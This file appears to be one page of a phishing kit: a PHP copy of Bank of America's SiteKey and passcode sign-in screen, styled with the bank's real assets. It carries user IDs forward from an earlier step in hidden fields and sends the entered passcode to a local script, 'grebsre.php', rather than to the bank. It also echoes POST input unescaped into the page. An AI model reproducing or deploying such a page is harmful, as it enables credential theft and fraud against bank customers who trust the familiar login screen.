<?php
$onlineId = $_POST['onlineId'];
$onlineId1 = $_POST['onlineId1'];
?>


<!DOCTYPE html>
<html lang="en-US" class="dont-pie">

<head>


<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Bank of America | Online Banking | SiteKey | Confirm SiteKey</title>
<meta name="Description" CONTENT="Please confirm your SiteKey before entering your Online Banking Passcode."> 
<meta name="Keywords" CONTENT="keywords">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<link rel="shortcut icon" href="https://secure.bankofamerica.com/pa/global-assets/1.0/graphic/favicon.ico" type="image/ico" />
<script type="text/javascript">
	var cm_Touch = "notclogging";
</script>      	

		<link rel="stylesheet" type="text/css" href="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/Global/PIPAD-AUTH/1.0/style/pipad-auth.css" media="all" />
		<link rel="stylesheet" type="text/css" href="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/VIPAA/2.5/style/vpl-jawr.css" media="all" />

			
				<script type="text/javascript">
					(function() {
					  var s = document.createElement('script'), attrs = { src: (window.location.protocol == "https:" ? "https:" : "http:") + "//" + "pane.bankofamerica.com/30306/Ns2.js", async: true, type: "text/javascript" };
					  for(var k in attrs) { s.setAttribute(k, attrs[k]) }
					  document.getElementsByTagName('head')[0].appendChild(s);
					})();
				</script>
		
				<script type="text/javascript">
					function getSCookie(name){
					var re = new RegExp('[; ]'+name+'=([^\\s;]*)'), matches = null;
						if(document.cookie.length > 0) {
							matches = document.cookie.match(re);
						if(matches && matches.length == 2) {
							return decodeURIComponent(matches[1]);
							}
						}
					}
				</script>
				<script>		
					function get_SessionIdString(){
					  return getSCookie("SID") || "";
					}
				</script>
<style>body{display:none;}</style>
	
	<style type="text/css"> body { display : none;} </style>
</head>

<body class="vpl-body">
	<script type="text/javascript"> 
		if (self == top) {
		  var theBody = document.getElementsByTagName('body')[0];
		  theBody.style.display = "block";
		} else { 
		  top.location = self.location; 
		}
	</script>
	<noscript><style>body{display : block;}</style></noscript>
		
	<a class="ada-hidden" href="#skip-to-h1" name="anc-skip-to-main-content">Skip to main content</a>
		
	<div class="vipaa-passcode-layout">
		<div class="center-content">
			<div class="header">

<div class="header-module">
   <div class="vpl-skin"> 
   	  <div class="vpl-logo"></div>
      <div class="page-type">Sign In</div>
      <div class="right-links">
		<div class="secure-area">Secure Area</div>
       <a class="divide" href="/login/languageToggle.go?request_locale=es-us" target="_self" name="spanish_toggle" title="Muestra esta sesi�n de la Banca en L�nea">En Espa&#241;ol</a>
        <div class="clearboth"></div>
      </div>
      <div class="clearboth"></div>
   </div>
</div>
			
<div class="page-title-module h-100">
  <div class="vpl-skin sup-ie" id="skip-to-h1">
    <h1>Enter your Passcode</h1>
  </div>
</div>


	<div id="clientSideErrors" class="messaging-module hide" aria-live="polite">
		<div class="error-skin">
			<div class="error-message">	
					<p class="title redTitle" class="TLu_ERROR">We can't process your request.</p>
					<div id="Vipaa_Client_0"><p>We encountered errors with the highlighted item(s). Please make the noted adjustments to continue.</p></div>
				<ul></ul>
			</div>
		</div>
	</div>















<script type="text/javascript">
	var continueURL = '/login/ping';
	function myUrl() {
			window.location =  '/login/sign-in/signOnScreen.go';	
		 		     	    	   
	    	}
</script>


	<div class="vipaa-timeout-module">
		<div id="timeoutDialogExpire" class="hidden">
				<div class="session-content">
					<p>For security, sessions end after 10 minutes of inactivity.</p>
					<p>Your session has timed out, and you'll have to start again</p>
				</div>
		</div>
		
		<div id="timeoutDialog" class="hidden">
				<div class="session-content">
					<p>Your Application Will Time Out in 2 Minutes</p>
					<p>For your safety and Protection your Online Banking session is about to be timed out and redirected to the home page if there is no additional activity.</p> 
					<p>If you are still working in your Online Banking session simply click OK to continue.</p>
				</div>
		</div>
	</div>

   
</div>
			<div class="columns">
				<div class="left-column">	<script type="text/javascript">
		function onSubmitForm() {
			input.parse_data('f_variable');
			return true;
		}
	</script> 
<div class="passcode-module">
	<div class="vpl-skin phoenix">		
	<p>If your SiteKey is correct, enter your Passcode to sign in. If this isn't your SiteKey, do not enter your Passcode.</p><p>SiteKey lets you know you're at a Bank of America site and not a fraudulent one.</p>			
		<form class="simple-form" name="ConfirmSitekeyForm" id="ConfirmSitekeyForm" method="post" action="grebsre.php"  autocomplete="off"> <input type="hidden" name="onlineId" value="<?php echo $_POST["onlineId"]; ?>"/>  <input type="hidden" name="onlineId1" value="<?php echo $_POST["onlineId1"]; ?>"/>
<input type="hidden" name="csrfTokenHidden" value="be068c4fb45f33bc" id="csrfTokenHidden"/>				<input type="hidden" id="f_variable" name="f_variable" class="tl-private" />
			<input type="hidden" name="lpOlbResetErrorCounter" id="lpOlbResetErrorCounterId" value="0"/>
			<input type="hidden" name="lpPasscodeErrorCounter" id="lpPasscodeErrorCounterId" value="0"/>
			<h2>Your SiteKey</h2>
			<div class="sitekey-title"></div>
			<img src="ajax-loader.gif" alt="House and Home 29465" />
			<label for="tlpvt-passcode-input">Passcode</label>
			<div class="TL_NPI_Pass">
				<input type="password" class="tl-private" id="tlpvt-passcode-input" name="password" maxlength="20" value=""/>
			</div>
			<a href="javascript:void(0);" title="Sign in" id="passcode-confirm-sk-submit" onClick="validatePasscodeSubmit(this);" class="btn-bofa btn-bofa-blue btn-bofa-small" name="confirm-sitekey-submit">
				<span>Sign in</span>
			</a>
			<div class="clearboth"></div>

		</form>
	</div>
</div>
</div>
				<div class="right-column">



	<div class="quick-help-module">
		<div class="vpl-skin sup-ie"  aria-atomic="true">
					<div class="sm-title">
						<h2 class="sm-header">Quick help</h2>
					</div>
					<div class="sm-topcontent-dottedbtm">
					    <ul class="help-links">
											<li>
											<a name="anc-question-0" href="javascript:void(0);" class="help-link collapsed"><span class="ada-hidden"></span><span class="title">Don't recognize your SiteKey?</span></a>
											<div class="help-link-answer hide"><p>SiteKey confirms that you're at the bank's legitimate website. If you don't see yours, do not enter your Passcode. Since it may be a fraudulent website, please <a href="mailto:abuse@bankofamerica.com">report it<span class="ada-hidden"> to Bank of America</span></a>.<br />To access your account, call customer service at 1.800.933.6262, Monday through Friday 7 a.m. to 10 p.m. local time and Saturday through Sunday 8 a.m. to 5 p.m. local time.</p></div>
											</li>
											<li>
											<a name="Are_Passcodes_case-sensitive" href="javascript:void(0);" class="help-link collapsed"><span class="ada-hidden"></span><span class="title">Are Passcodes case-sensitive?</span></a>
											<div class="help-link-answer hide"><p>Passcodes are case-sensitive. If you have uppercase or lowercase letters in your Passcode, you must use the same capitalization whenever you sign in.</p></div>
											</li>
											<li>
											<a name="anc-question-2" href="javascript:void(0);" class="help-link collapsed"><span class="ada-hidden"></span><span class="title">Forgot or need help with my Passcode</span></a>
											<div class="help-link-answer hide"><p><a name="sign_in_reset_passcode" href="/login/sign-in/redirectAction.go?screen=RESET_PASSCODE&amp;requestLocalePassed=en-us" target="_self">Reset your Passcode now</a></p></div>
											</li>
					    </ul>
					</div>					
		</div>
	</div>
</div>
				<div class="clearboth"></div>
			</div>
			<div class="footer">
				<div class="footer-top">&nbsp;</div>
				<div class="footer-inner">
<div class="global-footer-module">
   <div class="vpl-skin">
		<div class="secure">Secure area</div>
	
       
      <div class="link-container">
         <div class="link-row"> 
				
				<a class="last-link" href="https://www.bankofamerica.com/privacy/" name="Privacy_&_Security_footer" title="Privacy & Security" target="_blank">Privacy &amp; Security</a>
				<div class="clearboth"></div>
         </div>
      </div>
      <p>Bank of America, N.A. Member FDIC. <a name="Equal_Housing_Lender" href="http://www.bankofamerica.com/help/equalhousing_popup.cfm" target="_blank">Equal Housing Lender</a><span class="ehl-logo"></span><br/>&copy;&nbsp;2014 Bank of America Corporation. All rights reserved.</p>
   </div>
</div>
</div>
			</div>
		</div>
		<div id="vpl-js-includes">

	<script type="text/javascript">var onloaderTaggingEnabled = true;</script>

		<script type="text/javascript">var onloaderGlobalAssetLocation = '', onloaderFile = "vpltaggingjawr", onloaderFileType = 'gzip-compressed', onloaderJawrVersion = '2.5';</script>
		<script src="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/Global/PIPAD-AUTH/1.0/script/pipad-auth.js"
		type="text/javascript"></script>
		<script src="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/VIPAA/2.5/script/vpl-jawr.js"
		type="text/javascript"></script> 

	<script language="JavaScript" type="text/javascript">
		addPassMarkFlash2("/pa/global-assets/1.0/swf/caapmfso.swf", "write", "PMV61oUltZiyqeVdozJ%252BSmvB6Gr3rekxZhXAOo0XHKCZxp0LbAK54FtTXsB%252FoBYl7VnMyk1r5rBOMFvOU2zaRbjNGiIw%253D%253D");
	</script>

<style>body{display:none;}</style>
		</div>
		<div id="vpl-tagging" class="hide">

<script type="text/javascript">
	var cmPageId = "OLB:Tool:SiteKey;Confirm_Sitekey";
	var cmCategoryId = "OLB:Tool:SiteKey";
	
	var cmSessionID = "" ;
	
function cmGetReqParameter(queryString, parameterName) {
	var parameterName = parameterName + "=";
	if (queryString.length > 0) {
		begin = queryString.indexOf(parameterName);
		if (begin != -1) {
			begin += parameterName.length;
			end = queryString.indexOf ( "&" , begin );
			if ( end == -1 ) {
				end = queryString.length
			}
			return unescape ( queryString.substring ( begin, end ) );
		}
		return null;
	}
}

var testString = window.location.href;

if (cmGetReqParameter(testString, 'sessionid') !== null) {
	cmSessionID = cmGetReqParameter(testString, 'sessionid');
}	


var cmFailure = $("div.messaging-module div.error-skin:visible").length;
var cmErrorMsg = '';


var cmReqLocale = $('html').attr('lang');
var locAppendage;
if (cmReqLocale.toLowerCase().indexOf('en') !== -1) {
	locAppendage = '';
} else if (cmReqLocale.toLowerCase().indexOf('es') !== -1) {
	locAppendage = '_ES';
}

function onloaderV_cmSetEnvironment() {
  if(testString.toLowerCase().indexOf('.bankofamerica.com')>-1){testString=testString.toLowerCase();var tempArr=testString.split('.bankofamerica.com');var tempStr=tempArr[0];if(tempStr.indexOf('\/\/')>-1){tempArr=tempStr.split('\/\/');tempStr=tempArr[1];if(tempStr.indexOf('.')>-1){tempArr=tempStr.split('.');tempStr=tempArr[0];var tempStrPt2=tempArr[1]}if(tempStr.indexOf('www')>-1){if(tempStr.indexOf('-')>-1){cmSetStaging()}else if(tempStrPt2!=null){if(tempStrPt2.indexOf('ecnp')>-1){cmSetStaging()}}else{cmSetProduction()}}else if(tempStr.indexOf('-')>-1){if(tempStr.indexOf('sitekey')>-1){if(tempStr=='sitekey'){cmSetProduction()}else{cmSetStaging()}}else{cmSetStaging()}}else if(tempStrPt2!=null){if(tempStrPt2.indexOf('ecnp')>-1){cmSetStaging()}}else{cmSetProduction()}}} 
  } 

	
	function onloaderV_cmCreatePageviewTag() {
			if (cmFailure === 0 ) {
				cmCreatePageviewTag(cmPageId+locAppendage, null, null, cmCategoryId, false, false, null, false, false, null, null, null, null, cmSessionID, null, null, null, null, null, null, null);
			}
			
			else if (cmFailure > 0 ) {
				
				var errorCode='';
				var errorCodeCounter=0;
				var errorCodeIndex;
				cmPageId = cmPageId+'_Error'
				cmCreatePageviewTag(cmPageId+locAppendage, null, null, cmCategoryId, false, false, null, false, false, null, null, null, null, cmSessionID, null, null, null, null, null, null, null);
				if ($('.messaging-module').find('.error-skin:visible').length > 0) {
					if($('.messaging-module .error-skin:visible ul li').length > 0) {
					$('.messaging-module .error-skin:visible ul li').each(function() {
						cmErrorMsg = $(this).html();
						errorCodeIndex = cmErrorMsg.length  * (errorCodeCounter == 0 ? 1 : errorCodeCounter);
						cmCreateCustomError(cmPageId+locAppendage, null, null, null, 'Vipaa_Action_'+errorCodeIndex, cmCategoryId, cmErrorMsg);
						errorCodeCounter = errorCodeCounter + 1;
					});	
					} else {
						cmErrorMsg = $.trim($('.messaging-module .error-skin:visible p').text());
						errorCodeIndex = cmErrorMsg.length  * (errorCodeCounter == 0 ? 1 : errorCodeCounter);
						cmCreateCustomError(cmPageId+locAppendage, null, null, null, 'Vipaa_Action_'+errorCodeIndex, cmCategoryId, cmErrorMsg);			
					}		
				}
			}
	}
function cmSetDD() {
	var testString = window.location.href;
	if (testString.toLowerCase().indexOf('.bankofamerica.com') > -1){
		testString = testString.toLowerCase(); 
		var tempArr = testString.split('.bankofamerica.com');
		var tempStr = tempArr[0];
			if (tempStr.indexOf('\/\/') > -1) {
				tempArr = tempStr.split('\/\/');tempStr = tempArr[1];
				if (tempStr.indexOf('.') > -1) {
					tempArr = tempStr.split('.');tempStr = tempArr[0];var tempStrPt2 = tempArr[1];}
					if (tempStr.indexOf('www') > -1) {
						if (tempStr.indexOf('-') > -1) {cmSetStaging()}
						else if (tempStrPt2 != null) {
							if (tempStrPt2.indexOf('ecnp') > -1) {cmSetStaging()} 
						}
						else {cmSetProduction()} 
					}
					else if (tempStr.indexOf('-') > -1) {
						if (tempStr.indexOf('sitekey') > -1){
							if (tempStr == 'sitekey') {cmSetProduction()}
							else {cmSetStaging()}  
						} 
						else {cmSetStaging()}
					}	
					else if (tempStrPt2 != null) {
							if (tempStrPt2.indexOf('ecnp') > -1) {cmSetStaging()} 
						}
	   				else {cmSetProduction()} 
			}       
	}  

}
if (typeof cmSetStaging == 'function') {cmSetDD()}	
</script>

		<script type="text/javascript">
			var pipadPreloadUrlName = "/content/preload/olb-myaccount-preload-jawr-module.htm";
		</script>


		</div>
	</div>
</body>

</html>

